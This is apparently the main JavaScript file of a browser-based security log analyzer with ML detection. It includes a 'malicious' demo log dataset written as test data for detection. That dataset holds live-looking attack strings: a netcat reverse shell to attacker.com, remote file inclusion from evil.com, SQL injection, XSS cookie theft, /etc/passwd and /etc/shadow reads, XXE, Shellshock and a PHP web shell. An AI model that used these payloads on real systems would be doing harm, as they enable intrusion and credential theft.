// ============================================
// LOG ANALYSIS APPLICATION - MAIN LOGIC
// Browser-based log analyzer with ML detection
// ============================================

// Global state management (in-memory, no localStorage due to sandbox)
const AppState = {
    currentView: 'upload',
    logs: [],
    parsedLogs: [],
    analysisResults: null,
    charts: {},
    currentFilter: 'all'
};

// ============================================
// EMBEDDED DEMO DATASETS FOR TESTING
// ============================================

const SAMPLE_LOGS = {
    // Normal System Operations Dataset (30 entries)
    normal: `[2025-10-28 08:00:12] INFO System startup initiated - version 4.2.1
[2025-10-28 08:00:45] INFO Database connection pool initialized (max: 50)
[2025-10-28 08:01:23] INFO User login successful: john.doe@company.com from 192.168.1.45
[2025-10-28 08:02:15] INFO API request: GET /api/users - Response: 200 OK (125ms)
[2025-10-28 08:03:34] INFO Cache refresh completed - 1,234 entries updated
[2025-10-28 08:05:12] INFO User login successful: sarah.smith@company.com from 192.168.1.67
[2025-10-28 08:06:45] WARNING High memory usage detected: 78% (threshold: 80%)
[2025-10-28 08:08:23] INFO Scheduled backup job started: daily_backup_20251028
[2025-10-28 08:10:56] INFO API request: POST /api/reports - Response: 201 Created (234ms)
[2025-10-28 08:12:34] INFO Session cleanup completed - 45 expired sessions removed
[2025-10-28 08:14:12] INFO User logout: john.doe@company.com - Session duration: 12m
[2025-10-28 08:16:45] INFO Email notification sent to admin@company.com - Subject: Daily Report
[2025-10-28 08:18:23] INFO System health check passed - All services operational
[2025-10-28 08:20:56] INFO File upload completed: quarterly_report.pdf (2.4 MB) by sarah.smith
[2025-10-28 08:22:34] INFO Database transaction committed - 234 records updated
[2025-10-28 08:24:12] INFO User session created for user_id: 5678 - IP: 192.168.1.89
[2025-10-28 08:26:45] INFO Payment transaction processed: $149.99 - Order #ORD-2025-10234
[2025-10-28 08:28:23] WARNING Slow database query detected: 3.8s - Query ID: Q-8472
[2025-10-28 08:30:56] INFO API request: GET /api/dashboard/metrics - Response: 200 OK (89ms)
[2025-10-28 08:32:34] INFO Mobile push notification sent to 1,245 devices
[2025-10-28 08:34:12] INFO Cron job executed: cleanup_old_logs - 567 logs archived
[2025-10-28 08:36:45] INFO User password changed successfully for user_id: 3456
[2025-10-28 08:38:23] INFO Report generation completed: monthly_sales.xlsx (1.8 MB)
[2025-10-28 08:40:56] INFO API rate limiter reset - New window started
[2025-10-28 08:42:34] INFO Background task completed: data_synchronization (duration: 4m 23s)
[2025-10-28 08:44:12] INFO WebSocket connection established - Client ID: ws-client-7892
[2025-10-28 08:46:45] INFO Cache hit ratio: 94.3% - Performance optimal
[2025-10-28 08:48:23] INFO Backup job completed successfully - Size: 4.7 GB
[2025-10-28 08:50:56] INFO System metrics logged - CPU: 45%, Memory: 62%, Disk: 38%
[2025-10-28 08:52:34] INFO Log rotation completed - 10 log files archived`,

    // Malicious Activity Dataset (45 entries)
    malicious: `[2025-10-28 10:00:23] INFO Login attempt: admin from IP: 45.142.212.61
[2025-10-28 10:00:24] ERROR Login failed: admin - Invalid password - IP: 45.142.212.61
[2025-10-28 10:00:25] ERROR Login failed: admin - Invalid password - IP: 45.142.212.61
[2025-10-28 10:00:26] ERROR Login failed: admin - Invalid password - IP: 45.142.212.61
[2025-10-28 10:00:27] ERROR Login failed: admin - Invalid password - IP: 45.142.212.61
[2025-10-28 10:00:28] CRITICAL Brute force attack detected from IP: 45.142.212.61 - 5 attempts in 5s
[2025-10-28 10:01:45] WARNING SQL injection attempt detected: ' OR '1'='1' -- in username field
[2025-10-28 10:02:12] CRITICAL SQL payload: SELECT * FROM users WHERE id=1 UNION SELECT password FROM admin--
[2025-10-28 10:03:33] WARNING XSS attempt: <script>alert('XSS')</script> in comment field
[2025-10-28 10:04:21] CRITICAL XSS payload: <img src=x onerror=alert(document.cookie)>
[2025-10-28 10:05:45] ERROR Path traversal detected: ../../../../etc/passwd in file parameter
[2025-10-28 10:06:34] CRITICAL Directory traversal: ../../../windows/system32/config/sam
[2025-10-28 10:07:12] ERROR Command injection: ; cat /etc/shadow in input field
[2025-10-28 10:08:45] CRITICAL OS command injection: | nc -e /bin/bash attacker.com 4444
[2025-10-28 10:09:56] WARNING Port scan detected from IP: 103.224.56.89 - Ports: 22,80,443,3306,8080
[2025-10-28 10:11:23] ERROR SSH brute force detected - 47 failed login attempts in 2 minutes
[2025-10-28 10:12:45] WARNING Suspicious user agent detected: sqlmap/1.4.7#stable
[2025-10-28 10:13:34] CRITICAL Scanner detected: nikto/2.1.6 - IP: 185.220.101.42
[2025-10-28 10:14:56] ERROR File inclusion attempt: include($_GET['file']) - Param: file=http://evil.com/shell.txt
[2025-10-28 10:16:12] CRITICAL Remote file inclusion: <?php system($_GET['cmd']); ?>
[2025-10-28 10:17:45] ERROR Buffer overflow attempt in authentication module
[2025-10-28 10:18:34] WARNING LDAP injection: *)(uid=*))(|(uid=* in search parameter
[2025-10-28 10:19:56] CRITICAL LDAP exploit: admin)(|(password=*)) - Bypass attempt
[2025-10-28 10:21:23] ERROR Code execution attempt: eval($_POST['cmd']) in API endpoint
[2025-10-28 10:22:45] CRITICAL Remote code execution: system('whoami'); detected
[2025-10-28 10:24:12] ERROR Unauthorized API access - Invalid JWT token from IP: 198.50.235.78
[2025-10-28 10:25:34] WARNING Privilege escalation attempt - User trying to access admin panel
[2025-10-28 10:26:56] CRITICAL XXE attack: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
[2025-10-28 10:28:23] ERROR XML entity injection in SOAP request
[2025-10-28 10:29:45] WARNING Session hijacking attempt - Cookie manipulation detected
[2025-10-28 10:31:12] CRITICAL Session fixation attack from IP: 94.102.49.123
[2025-10-28 10:32:34] ERROR CSRF token mismatch - Possible cross-site request forgery
[2025-10-28 10:33:56] WARNING CSRF attack: State-changing request without valid token
[2025-10-28 10:35:23] CRITICAL Deserialization attack: O:8:"stdClass":1:{s:4:"code";s:6:"system";}
[2025-10-28 10:36:45] ERROR Unsafe deserialization in session handler
[2025-10-28 10:38:12] WARNING Malicious file upload detected: shell.php (MD5: 6c41e43c29a6ebcf)
[2025-10-28 10:39:34] CRITICAL PHP web shell uploaded: c99.php - Quarantined
[2025-10-28 10:41:56] ERROR Rate limit exceeded: 1000 requests in 60s from IP: 167.94.138.61
[2025-10-28 10:43:23] WARNING DDoS attack suspected - 5000 requests from 50 IPs in 5 minutes
[2025-10-28 10:44:45] CRITICAL Denial of service: Resource exhaustion attack detected
[2025-10-28 10:46:12] ERROR Cryptocurrency mining script detected: coinhive.min.js
[2025-10-28 10:47:34] WARNING Suspicious JavaScript: WebAssembly crypto miner loaded
[2025-10-28 10:48:56] CRITICAL Ransomware signature detected in uploaded file: cryptolocker variant
[2025-10-28 10:50:23] ERROR Exploit attempt: CVE-2024-1234 - Apache Log4j vulnerability
[2025-10-28 10:51:45] WARNING Shellshock attack: () { :; }; /bin/bash -c "cat /etc/passwd"
[2025-10-28 10:53:12] CRITICAL Privilege escalation: Attempting to execute as root user
[2025-10-28 10:54:34] ERROR Backdoor detected: Suspicious cron job created by web user`
};

// Dataset metadata for statistics
const DATASET_INFO = {
    normal: {
        name: 'Normal System Operations',
        description: 'Typical system logs showing normal operations, user activity, and maintenance tasks',
        entries: 30,
        severityLevels: ['INFO', 'WARNING'],
        timeRange: '08:00 - 08:52'
    },
    malicious: {
        name: 'Security Incidents & Attacks',
        description: 'Logs containing various attack patterns: SQL injection, XSS, brute force, RCE, and more',
        entries: 45,
        severityLevels: ['WARNING', 'ERROR', 'CRITICAL'],
        timeRange: '10:00 - 10:54'
    },
    compare: {
        name: 'Combined Dataset Analysis',
        description: 'Mixed dataset with both normal operations and malicious activity for comprehensive analysis',
        entries: 75,
        severityLevels: ['INFO', 'WARNING', 'ERROR', 'CRITICAL'],
        timeRange: '08:00 - 10:54'
    }
};

// ============================================
// INITIALIZATION
// ============================================

document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 Log Analysis Application Initialized');
    
    setupEventListeners();
    initializeCharts();
    updateStatus('Ready', 'success');
});

// ============================================
// EVENT LISTENERS SETUP
// ============================================

function setupEventListeners() {
    // File upload
    const fileInput = document.getElementById('fileInput');
    const dropZone = document.getElementById('dropZone');
    
    fileInput.addEventListener('change', handleFileSelect);
    
    dropZone.addEventListener('click', () => fileInput.click());
    
    dropZone.addEventListener('dragover', (e) => {
        e.preventDefault();
        dropZone.classList.add('dragover');
    });
    
    dropZone.addEventListener('dragleave', () => {
        dropZone.classList.remove('dragover');
    });
    
    dropZone.addEventListener('drop', (e) => {
        e.preventDefault();
        dropZone.classList.remove('dragover');
        const files = e.dataTransfer.files;
        if (files.length > 0) {
            handleFile(files[0]);
        }
    });
    
    // Sensitivity slider
    const sensitivity = document.getElementById('sensitivity');
    sensitivity.addEventListener('input', (e) => {
        const value = e.target.value;
        const label = e.target.nextElementSibling;
        if (value <= 3) label.textContent = 'Low';
        else if (value <= 7) label.textContent = 'Medium';
        else label.textContent = 'High';
    });
}

// ============================================
// VIEW SWITCHING
// ============================================

function switchView(viewName) {
    // Update navigation
    document.querySelectorAll('.nav-item').forEach(item => {
        item.classList.remove('active');
    });
    document.querySelector(`[data-view="${viewName}"]`).classList.add('active');
    
    // Update content
    document.querySelectorAll('.view-content').forEach(view => {
        view.classList.remove('active');
    });
    document.getElementById(`${viewName}View`).classList.add('active');
    
    AppState.currentView = viewName;
}

// ============================================
// FILE HANDLING
// ============================================

function handleFileSelect(e) {
    const file = e.target.files[0];
    if (file) {
        handleFile(file);
    }
}

function handleFile(file) {
    if (!file.name.endsWith('.log') && !file.name.endsWith('.txt')) {
        alert('Please upload a .log or .txt file');
        return;
    }
    
    updateStatus('Reading file...', 'info');
    
    const reader = new FileReader();
    reader.onload = (e) => {
        const content = e.target.result;
        processLogContent(content, file.name);
    };
    reader.onerror = () => {
        updateStatus('Error reading file', 'error');
    };
    reader.readAsText(file);
}

function loadSampleLog(type) {
    let content, filename;
    
    if (type === 'compare') {
        // Combine both datasets for comparison
        content = SAMPLE_LOGS.normal + '\n' + SAMPLE_LOGS.malicious;
        filename = 'combined-demo-logs.txt';
    } else {
        content = SAMPLE_LOGS[type];
        filename = type === 'normal' ? 'normal-demo-logs.txt' : 'malicious-demo-logs.txt';
    }
    
    // Show dataset info
    showDatasetInfo(type);
    
    processLogContent(content, filename);
}

function showDatasetInfo(type) {
    const info = DATASET_INFO[type];
    if (!info) return;
    
    const message = `📊 Loaded: ${info.name} - ${info.entries} entries (${info.timeRange})`;
    updateStatus(message, 'success');
    
    console.log('📦 Dataset Info:', info);
}

function clearAllData() {
    if (AppState.parsedLogs.length === 0) {
        alert('No data to clear');
        return;
    }
    
    if (!confirm('Are you sure you want to clear all data and reset the application?')) {
        return;
    }
    
    // Reset application state
    AppState.logs = [];
    AppState.parsedLogs = [];
    AppState.analysisResults = null;
    AppState.currentFilter = 'all';
    
    // Clear UI
    displayLogs();
    updateLogStats();
    clearCharts();
    clearAnalysisView();
    
    // Switch back to upload view
    switchView('upload');
    updateStatus('Data cleared - Ready for new analysis', 'info');
    
    console.log('🧹 All data cleared');
}

function clearCharts() {
    // Reset all charts to empty state
    if (AppState.charts.timeline) {
        AppState.charts.timeline.data.labels = [];
        AppState.charts.timeline.data.datasets[0].data = [];
        AppState.charts.timeline.update();
    }
    
    if (AppState.charts.severity) {
        AppState.charts.severity.data.datasets[0].data = [0, 0, 0, 0, 0];
        AppState.charts.severity.update();
    }
    
    if (AppState.charts.cluster) {
        AppState.charts.cluster.data.datasets = [];
        AppState.charts.cluster.update();
    }
    
    // Clear keywords
    const keywordsContainer = document.getElementById('keywordsContainer');
    if (keywordsContainer) {
        keywordsContainer.innerHTML = '<p class="text-muted text-center py-4">Run analysis to see keywords</p>';
    }
}

function clearAnalysisView() {
    // Clear attack indicators
    const attackIndicators = document.getElementById('attackIndicators');
    if (attackIndicators) {
        attackIndicators.innerHTML = '<p class="text-muted">No analysis results yet. Run analysis on uploaded logs.</p>';
    }
    
    // Clear cluster summary
    const clusterSummary = document.getElementById('clusterSummary');
    if (clusterSummary) {
        clusterSummary.innerHTML = '<p class="text-muted">No clusters detected yet.</p>';
    }
    
    // Clear pattern summary
    const patternSummary = document.getElementById('patternSummary');
    if (patternSummary) {
        patternSummary.innerHTML = '<p class="text-muted">No patterns detected yet.</p>';
    }
}

function processLogContent(content, filename) {
    showLoading(true);
    updateStatus('Processing logs...', 'info');
    
    // Simulate processing delay for UX
    setTimeout(() => {
        AppState.logs = content.split('\n').filter(line => line.trim());
        AppState.parsedLogs = parseLogLines(AppState.logs);
        
        displayLogs();
        updateLogStats();
        switchView('logs');
        
        updateStatus(`Loaded ${AppState.logs.length} logs from ${filename}`, 'success');
        showLoading(false);
    }, 500);
}

// ============================================
// LOG PARSING
// ============================================

function parseLogLines(lines) {
    return lines.map((line, index) => {
        // Parse log format: [timestamp] SEVERITY message
        const match = line.match(/\[(.*?)\]\s+(\w+)\s+(.+)/);
        
        if (match) {
            return {
                id: index,
                timestamp: match[1],
                severity: match[2].toLowerCase(),
                message: match[3],
                rawLine: line,
                suspicious: false,
                score: 0
            };
        }
        
        // Fallback for non-standard format
        return {
            id: index,
            timestamp: 'Unknown',
            severity: 'info',
            message: line,
            rawLine: line,
            suspicious: false,
            score: 0
        };
    });
}

// ============================================
// LOG DISPLAY
// ============================================

function displayLogs() {
    const logViewer = document.getElementById('logViewer');
    
    if (AppState.parsedLogs.length === 0) {
        logViewer.innerHTML = `
            <div class="text-center text-muted py-5">
                <i class="bi bi-inbox" style="font-size: 3rem;"></i>
                <p class="mt-3">No logs to display</p>
            </div>
        `;
        return;
    }
    
    let filteredLogs = AppState.parsedLogs;
    
    if (AppState.currentFilter === 'suspicious') {
        filteredLogs = AppState.parsedLogs.filter(log => log.suspicious);
    } else if (AppState.currentFilter === 'errors') {
        filteredLogs = AppState.parsedLogs.filter(log => 
            log.severity === 'error' || log.severity === 'critical'
        );
    }
    
    logViewer.innerHTML = filteredLogs.map(log => {
        const severityClass = log.suspicious ? 'suspicious' : log.severity;
        const scoreHtml = log.suspicious ? 
            `<span class="log-score">${(log.score * 100).toFixed(0)}%</span>` : '';
        
        return `
            <div class="log-line ${severityClass}" data-id="${log.id}">
                <span class="log-timestamp">${log.timestamp}</span>
                <span class="log-severity">${log.severity}</span>
                <span class="log-message">${escapeHtml(log.message)}</span>
                ${scoreHtml}
            </div>
        `;
    }).join('');
}

function filterLogs(filterType) {
    AppState.currentFilter = filterType;
    displayLogs();
}

function updateLogStats() {
    const total = AppState.parsedLogs.length;
    const suspicious = AppState.parsedLogs.filter(log => log.suspicious).length;
    const errors = AppState.parsedLogs.filter(log => 
        log.severity === 'error' || log.severity === 'critical'
    ).length;
    const warnings = AppState.parsedLogs.filter(log => log.severity === 'warning').length;
    
    document.getElementById('totalLogs').textContent = total;
    document.getElementById('suspiciousLogs').textContent = suspicious;
    document.getElementById('errorLogs').textContent = errors;
    document.getElementById('warningLogs').textContent = warnings;
}

// ============================================
// ANALYSIS RUNNER
// ============================================

function runAnalysis() {
    if (AppState.parsedLogs.length === 0) {
        alert('Please load log files first');
        return;
    }
    
    showLoading(true);
    updateStatus('Running ML analysis...', 'info');
    
    const algorithm = document.getElementById('mlAlgorithm').value;
    const sensitivity = parseInt(document.getElementById('sensitivity').value);
    
    // Run analysis in next tick to allow UI update
    setTimeout(() => {
        try {
            // Call ML detection from ml-detection.js
            AppState.analysisResults = analyzeLogsWithML(AppState.parsedLogs, algorithm, sensitivity);
            
            // Update parsed logs with detection results
            AppState.parsedLogs = AppState.analysisResults.logs;
            
            // Update all views
            displayLogs();
            updateLogStats();
            updateDashboard();
            updateAnalysisView();
            
            updateStatus('Analysis complete', 'success');
            switchView('dashboard');
        } catch (error) {
            console.error('Analysis error:', error);
            updateStatus('Analysis failed', 'error');
        } finally {
            showLoading(false);
        }
    }, 100);
}

// ============================================
// DASHBOARD UPDATES
// ============================================

function updateDashboard() {
    if (!AppState.analysisResults) return;
    
    updateTimelineChart();
    updateSeverityChart();
    updateClusterChart();
    updateKeywords();
}

function initializeCharts() {
    // Initialize empty charts
    const timelineCtx = document.getElementById('timelineChart');
    const severityCtx = document.getElementById('severityChart');
    const clusterCtx = document.getElementById('clusterChart');
    
    if (timelineCtx) {
        AppState.charts.timeline = new Chart(timelineCtx, {
            type: 'line',
            data: {
                labels: [],
                datasets: [{
                    label: 'Events',
                    data: [],
                    borderColor: '#1FB8CD',
                    backgroundColor: 'rgba(31, 184, 205, 0.1)',
                    tension: 0.4
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: { labels: { color: '#e0e6ed' } }
                },
                scales: {
                    x: { ticks: { color: '#8f9bb3' }, grid: { color: 'rgba(0, 217, 255, 0.1)' } },
                    y: { ticks: { color: '#8f9bb3' }, grid: { color: 'rgba(0, 217, 255, 0.1)' } }
                }
            }
        });
    }
    
    if (severityCtx) {
        AppState.charts.severity = new Chart(severityCtx, {
            type: 'doughnut',
            data: {
                labels: ['Info', 'Warning', 'Error', 'Critical', 'Suspicious'],
                datasets: [{
                    data: [0, 0, 0, 0, 0],
                    backgroundColor: ['#82aaff', '#ffcb6b', '#ff5370', '#ff0000', '#7b2ff7']
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: { labels: { color: '#e0e6ed' } }
                }
            }
        });
    }
    
    if (clusterCtx) {
        AppState.charts.cluster = new Chart(clusterCtx, {
            type: 'scatter',
            data: {
                datasets: []
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: { labels: { color: '#e0e6ed' } }
                },
                scales: {
                    x: { ticks: { color: '#8f9bb3' }, grid: { color: 'rgba(0, 217, 255, 0.1)' } },
                    y: { ticks: { color: '#8f9bb3' }, grid: { color: 'rgba(0, 217, 255, 0.1)' } }
                }
            }
        });
    }
}

function updateTimelineChart() {
    if (!AppState.charts.timeline || !AppState.analysisResults) return;
    
    const timeline = AppState.analysisResults.timeline || {};
    const labels = Object.keys(timeline).sort();
    const data = labels.map(label => timeline[label]);
    
    AppState.charts.timeline.data.labels = labels;
    AppState.charts.timeline.data.datasets[0].data = data;
    AppState.charts.timeline.update();
}

function updateSeverityChart() {
    if (!AppState.charts.severity || !AppState.parsedLogs) return;
    
    const counts = {
        info: 0,
        warning: 0,
        error: 0,
        critical: 0,
        suspicious: 0
    };
    
    AppState.parsedLogs.forEach(log => {
        if (log.suspicious) {
            counts.suspicious++;
        } else {
            counts[log.severity] = (counts[log.severity] || 0) + 1;
        }
    });
    
    AppState.charts.severity.data.datasets[0].data = [
        counts.info,
        counts.warning,
        counts.error,
        counts.critical,
        counts.suspicious
    ];
    AppState.charts.severity.update();
}

function updateClusterChart() {
    if (!AppState.charts.cluster || !AppState.analysisResults) return;
    
    const clusters = AppState.analysisResults.clusters || [];
    const colors = ['#1FB8CD', '#FFC185', '#B4413C', '#5D878F', '#DB4545', '#D2BA4C'];
    
    const datasets = clusters.map((cluster, idx) => ({
        label: `Cluster ${idx}`,
        data: cluster.points || [],
        backgroundColor: colors[idx % colors.length],
        pointRadius: 5
    }));
    
    AppState.charts.cluster.data.datasets = datasets;
    AppState.charts.cluster.update();
}

function updateKeywords() {
    const container = document.getElementById('keywordsContainer');
    
    if (!AppState.analysisResults || !AppState.analysisResults.keywords) {
        container.innerHTML = '<p class="text-muted text-center py-4">No keywords detected</p>';
        return;
    }
    
    const keywords = AppState.analysisResults.keywords.slice(0, 15);
    
    container.innerHTML = keywords.map(kw => `
        <div class="keyword-badge">
            <span>${escapeHtml(kw.word)}</span>
            <span class="keyword-score">${kw.score.toFixed(2)}</span>
        </div>
    `).join('');
}

// ============================================
// ANALYSIS VIEW
// ============================================

function updateAnalysisView() {
    if (!AppState.analysisResults) return;
    
    updateAttackIndicators();
    updateClusterSummary();
    updatePatternSummary();
}

function updateAttackIndicators() {
    const container = document.getElementById('attackIndicators');
    const indicators = AppState.analysisResults.attackIndicators || [];
    
    if (indicators.length === 0) {
        container.innerHTML = '<p class="text-muted">No attack indicators detected</p>';
        return;
    }
    
    container.innerHTML = indicators.map(indicator => `
        <div class="indicator-item">
            <div class="indicator-header">
                <span class="indicator-type">${escapeHtml(indicator.type)}</span>
                <span class="indicator-count">${indicator.count} occurrence(s)</span>
            </div>
            <div class="indicator-description">${escapeHtml(indicator.description)}</div>
        </div>
    `).join('');
}

function updateClusterSummary() {
    const container = document.getElementById('clusterSummary');
    const clusters = AppState.analysisResults.clusterSummary || [];
    
    if (clusters.length === 0) {
        container.innerHTML = '<p class="text-muted">No clusters detected</p>';
        return;
    }
    
    container.innerHTML = clusters.map((cluster, idx) => `
        <div class="cluster-item">
            <div class="indicator-header">
                <span class="indicator-type">Cluster ${idx + 1}</span>
                <span class="indicator-count">${cluster.size} logs</span>
            </div>
            <div class="indicator-description">${escapeHtml(cluster.description)}</div>
        </div>
    `).join('');
}

function updatePatternSummary() {
    const container = document.getElementById('patternSummary');
    const patterns = AppState.analysisResults.patterns || [];
    
    if (patterns.length === 0) {
        container.innerHTML = '<p class="text-muted">No patterns detected</p>';
        return;
    }
    
    container.innerHTML = patterns.map(pattern => `
        <div class="pattern-item">
            <div class="indicator-header">
                <span class="indicator-type">${escapeHtml(pattern.pattern)}</span>
                <span class="indicator-count">${pattern.frequency} times</span>
            </div>
            <div class="indicator-description">Appears frequently in logs</div>
        </div>
    `).join('');
}

// ============================================
// EXPORT FUNCTIONALITY
// ============================================

function exportReport(format) {
    if (!AppState.analysisResults) {
        alert('Please run analysis first');
        return;
    }
    
    updateStatus(`Exporting ${format.toUpperCase()}...`, 'info');
    
    try {
        let content, filename, type;
        
        if (format === 'csv') {
            content = generateCSV();
            filename = 'log-analysis-report.csv';
            type = 'text/csv;charset=utf-8';
        } else if (format === 'json') {
            content = generateJSON();
            filename = 'log-analysis-report.json';
            type = 'application/json;charset=utf-8';
        } else if (format === 'txt') {
            content = generateTXT();
            filename = 'log-analysis-report.txt';
            type = 'text/plain;charset=utf-8';
        }
        
        const blob = new Blob([content], { type });
        saveAs(blob, filename);
        
        updateStatus('Export complete', 'success');
    } catch (error) {
        console.error('Export error:', error);
        updateStatus('Export failed', 'error');
    }
}

function generateCSV() {
    let csv = 'Timestamp,Severity,Message,Suspicious,Score\n';
    
    AppState.parsedLogs.forEach(log => {
        const row = [
            log.timestamp,
            log.severity,
            `"${log.message.replace(/"/g, '""')}"`,
            log.suspicious ? 'Yes' : 'No',
            (log.score * 100).toFixed(2)
        ];
        csv += row.join(',') + '\n';
    });
    
    return csv;
}

function generateJSON() {
    return JSON.stringify({
        metadata: {
            exportDate: new Date().toISOString(),
            totalLogs: AppState.parsedLogs.length,
            suspiciousLogs: AppState.parsedLogs.filter(l => l.suspicious).length
        },
        logs: AppState.parsedLogs,
        analysis: AppState.analysisResults
    }, null, 2);
}

function generateTXT() {
    let txt = '='.repeat(60) + '\n';
    txt += 'LOG ANALYSIS REPORT\n';
    txt += '='.repeat(60) + '\n\n';
    txt += `Export Date: ${new Date().toLocaleString()}\n`;
    txt += `Total Logs: ${AppState.parsedLogs.length}\n`;
    txt += `Suspicious Logs: ${AppState.parsedLogs.filter(l => l.suspicious).length}\n\n`;
    
    txt += 'ATTACK INDICATORS:\n';
    txt += '-'.repeat(60) + '\n';
    (AppState.analysisResults.attackIndicators || []).forEach(ind => {
        txt += `${ind.type}: ${ind.count} occurrence(s)\n`;
        txt += `  ${ind.description}\n\n`;
    });
    
    txt += '\nSUSPICIOUS LOGS:\n';
    txt += '-'.repeat(60) + '\n';
    AppState.parsedLogs.filter(l => l.suspicious).forEach(log => {
        txt += `[${log.timestamp}] ${log.severity.toUpperCase()} - Score: ${(log.score * 100).toFixed(0)}%\n`;
        txt += `  ${log.message}\n\n`;
    });
    
    return txt;
}

// ============================================
// UTILITY FUNCTIONS
// ============================================

function showLoading(show) {
    const overlay = document.getElementById('loadingOverlay');
    if (show) {
        overlay.classList.add('active');
    } else {
        overlay.classList.remove('active');
    }
}

function updateStatus(message, type) {
    const badge = document.getElementById('statusBadge');
    badge.innerHTML = `<i class="bi bi-circle-fill"></i> ${message}`;
    
    // Update color based on type
    badge.style.borderColor = type === 'success' ? '#00d9ff' : 
                              type === 'error' ? '#ff5370' : 
                              type === 'info' ? '#82aaff' : '#00d9ff';
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

console.log('✅ App.js loaded successfully');